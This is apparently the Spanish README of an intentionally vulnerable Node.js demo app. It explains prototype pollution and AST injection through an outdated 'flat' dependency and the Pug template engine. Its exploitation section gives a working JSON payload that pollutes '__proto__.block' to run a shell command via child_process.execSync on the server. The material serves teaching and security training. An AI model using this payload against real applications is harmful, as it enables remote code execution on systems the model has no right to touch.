# Vulnerable and Outdated Components

[Más info sobre las vulenerabilidades en dependencias](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)

App ejemplo con dependecias vulenarables por ataques de AST Injection y Prototype Pollution

## Requerimientos

*  [Node.js](https://nodejs.org/en/) - (LTS or superior) 

* Para Linux and Mac - usar [nvm](https://github.com/creationix/nvm) para instalar Node

*  [Git](https://git-scm.com/downloads)

## Instalación

Clonar el repositorio:

```bash
git clone https://github.com/ezequielsoler/vulnerable-dependency-example.git
```

Ingresar al repositorio:

```bash
cd vulnerable-dependency-example
```

Instalar las dependencia usando NPM:

```bash
npm install
```

Correr de forma local el servidor usando Node:

```bash
node server.js
```

Si todo salió bien, deberías ver el mensaje: `Server listening at localhost:3000` y al ingresar con tu navegador a  [localhost:3000](http://localhost:3000/) podrás ver la página.

## ¿Qué son las vulnerabilidades de Prototype Pollution?

JavaScript se basa en prototipos: cuando se crean nuevos objetos, estos transfieren las propiedades y métodos del prototipo de “objeto”, que contiene funcionalidades básicas como `toString`, `constructor` y `hasOwnProperty`.

Los atacantes pueden realizar cambios en toda la aplicación en todos los objetos modificando el objeto 'original', de ahí el nombre contaminación de prototipo ni siquiera necesitan modificar directamente el objeto; pueden acceder a él a través de la propiedad `__proto__` de cualquier objeto JavaScript. Y una vez que realiza un cambio en el objeto, se aplica a todos los objetos JavaScript, incluidos los creados después de la manipulación.

[Más info sobre esta vulnerabilidad](https://www.whitesourcesoftware.com/resources/blog/prototype-pollution-vulnerabilities/)

## ¿Qué es la inyección AST?

En Node JS, AST ([Abstract Syntax Tree](https://en.wikipedia.org/wiki/Abstract_syntax_tree)) se usa en JS muy a menudo, como motores de template, TypeScript, etc. 

Si existe una vulnerabilidad de Prototype Pollution en cualquier dependencia de la aplicación, cualquier AST puede ser modificado por medio de una inyección de código que sería ejecutada durante el proceso de "parseo" o de compilación.


## Explotación

Esta app tiene la dependencia desactaulizada [Flat](https://www.npmjs.com/package/flat) que es [vulnerable](https://github.com/hughsk/flat/issues/105) al ataque antes mencionado, para comprobar como funciona el Prototype Pollution en flat puedes ejecutar el siguiente comando:

```bash
node vulnerable-test.js
```

Para realizar el ataque usaremos la vulnerabilidad de Flat para contaminar el objeto block que es ejecutado dentro del AST ejecutado por la dependencia [Pug](https://www.npmjs.com/package/pug) al ejecutar el método `compile` y nos permitirá la ejecución arbitraria de código.

[Más detalle](https://blog.p6.is/AST-Injection/)

Para eso inyectaremos el siguiente payload en el request POST del siguiente endpoint `http://localhost:3000/api/submit` 

```json
{
    "search": "iPhone",
    "__proto__.block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').execSync(`whoami > static/out.html`)"
    }
}
```

Si el ataque se ejecuto de manera exitosa deberías obtener el resultado del comando `whoami`al ingresar a:

```
http://localhost:3000/static/out.html
```






